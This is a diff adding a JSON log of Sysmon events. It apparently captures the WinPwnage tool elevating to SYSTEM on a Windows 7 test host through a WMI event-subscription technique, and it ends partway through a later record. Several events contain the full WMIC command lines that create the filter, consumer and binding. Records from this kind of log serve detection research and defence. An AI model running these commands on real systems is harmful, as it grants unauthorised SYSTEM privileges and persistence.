@@ -1,0 +1,1710 @@
+[
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:57:49.903160+00:00"
+                },
+                "EventRecordID": "16108",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:57:49.903"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d1d-5cd7-0000-001020ef1500}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3140"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "python  winpwnage.py -u elevate -5 -p c:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-0807-5cd7-0000-002091450100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000014591"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0c15-5cd7-0000-0010fb1c1500}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "2404"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "\"C:\\Windows\\System32\\cmd.exe\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:22.809408+00:00"
+                },
+                "EventRecordID": "16109",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:22.793"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "python  winpwnage.py -u elevate -i 5 -p c:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-0807-5cd7-0000-002091450100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000014591"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0c15-5cd7-0000-0010fb1c1500}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "2404"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "\"C:\\Windows\\System32\\cmd.exe\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:23.215658+00:00"
+                },
+                "EventRecordID": "16110",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:23.200"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d3f-5cd7-0000-0010db251600}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3184"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "WMI Commandline Utility"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"BotConsumer23\", ExecutablePath=\"c:\\Windows\\System32\\cmd.exe\", CommandLineTemplate=\"c:\\Windows\\System32\\cmd.exe\""
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-0807-5cd7-0000-002091450100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000014591"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u elevate -i 5 -p c:\\Windows\\System32\\cmd.exe"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "20"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "20",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:23.340658+00:00"
+                },
+                "EventRecordID": "16111",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "4092"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "EventType",
+                        "#text": "WmiConsumerEvent"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:23.340"
+                    },
+                    {
+                        "@Name": "Operation",
+                        "#text": "Created"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "Name",
+                        "#text": "\"BotConsumer23\""
+                    },
+                    {
+                        "@Name": "Type",
+                        "#text": "Command Line"
+                    },
+                    {
+                        "@Name": "Destination",
+                        "#text": "\"c:\\\\Windows\\\\System32\\\\cmd.exe\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "21"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "21",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:23.418783+00:00"
+                },
+                "EventRecordID": "16112",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "4092"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "EventType",
+                        "#text": "WmiBindingEvent"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:23.418"
+                    },
+                    {
+                        "@Name": "Operation",
+                        "#text": "Created"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "Consumer",
+                        "#text": "\"CommandLineEventConsumer.Name=\\\"BotConsumer23\\\"\""
+                    },
+                    {
+                        "@Name": "Filter",
+                        "#text": "\"__EventFilter.Name=\\\"BotFilter82\\\"\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:23.450035+00:00"
+                },
+                "EventRecordID": "16113",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:23.356"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d3f-5cd7-0000-00108b381600}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3196"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "WMI Commandline Utility"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=\"BotFilter82\"', Consumer='CommandLineEventConsumer.Name=\"BotConsumer23\"'"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-0807-5cd7-0000-002091450100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000014591"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u elevate -i 5 -p c:\\Windows\\System32\\cmd.exe"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:23.590658+00:00"
+                },
+                "EventRecordID": "16114",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:23.450"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d3f-5cd7-0000-001089471600}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "1616"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "WMI Commandline Utility"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"BotFilter82\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\""
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-0807-5cd7-0000-002091450100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000014591"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u elevate -i 5 -p c:\\Windows\\System32\\cmd.exe"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "19"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "19",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:39.746908+00:00"
+                },
+                "EventRecordID": "16115",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "4092"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "EventType",
+                        "#text": "WmiFilterEvent"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:39.746"
+                    },
+                    {
+                        "@Name": "Operation",
+                        "#text": "Created"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "EventNamespace",
+                        "#text": "\"root\\\\cimv2\""
+                    },
+                    {
+                        "@Name": "Name",
+                        "#text": "\"BotFilter82\""
+                    },
+                    {
+                        "@Name": "Query",
+                        "#text": "\"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:50.090658+00:00"
+                },
+                "EventRecordID": "16116",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:50.075"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d5a-5cd7-0000-001069031700}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2544"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7601.17514 (win7sp1_rtm.101119-1850)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Command Processor"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "c:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Windows\\system32\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "NT AUTHORITY\\SYSTEM"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-8693-5cd7-0000-0020e7030000}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x00000000000003e7"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "0"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "System"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0d3f-5cd7-0000-00107f541600}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "3212"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "10"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "10",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:54.762533+00:00"
+                },
+                "EventRecordID": "16117",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:54.762"
+                    },
+                    {
+                        "@Name": "SourceProcessGUID",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "SourceProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "SourceThreadId",
+                        "#text": "2796"
+                    },
+                    {
+                        "@Name": "SourceImage",
+                        "#text": "c:\\python27\\python.exe"
+                    },
+                    {
+                        "@Name": "TargetProcessGUID",
+                        "#text": "{365abb72-8693-5cd7-0000-0010f4570000}"
+                    },
+                    {
+                        "@Name": "TargetProcessId",
+                        "#text": "444"
+                    },
+                    {
+                        "@Name": "TargetImage",
+                        "#text": "C:\\Windows\\system32\\winlogon.exe"
+                    },
+                    {
+                        "@Name": "GrantedAccess",
+                        "#text": "0x00001410"
+                    },
+                    {
+                        "@Name": "CallTrace",
+                        "#text": "C:\\Windows\\SYSTEM32\\ntdll.dll+4591c|C:\\Windows\\system32\\KERNELBASE.dll+8185|c:\\python27\\DLLs\\_ctypes.pyd+ed6a|c:\\python27\\DLLs\\_ctypes.pyd+d9d6|c:\\python27\\DLLs\\_ctypes.pyd+999e|c:\\python27\\DLLs\\_ctypes.pyd+a1ce|c:\\python27\\DLLs\\_ctypes.pyd+5b71|C:\\Windows\\system32\\python27.dll+8f14c|C:\\Windows\\system32\\python27.dll+113384|C:\\Windows\\system32\\python27.dll+112f24|C:\\Windows\\system32\\python27.dll+110c7e|C:\\Windows\\system32\\python27.dll+113001|C:\\Windows\\system32\\python27.dll+112f12|C:\\Windows\\system32\\python27.dll+110c7e|C:\\Windows\\system32\\python27.dll+113001|C:\\Windows\\system32\\python27.dll+112f12"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "10"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "10",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:54.762533+00:00"
+                },
+                "EventRecordID": "16118",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
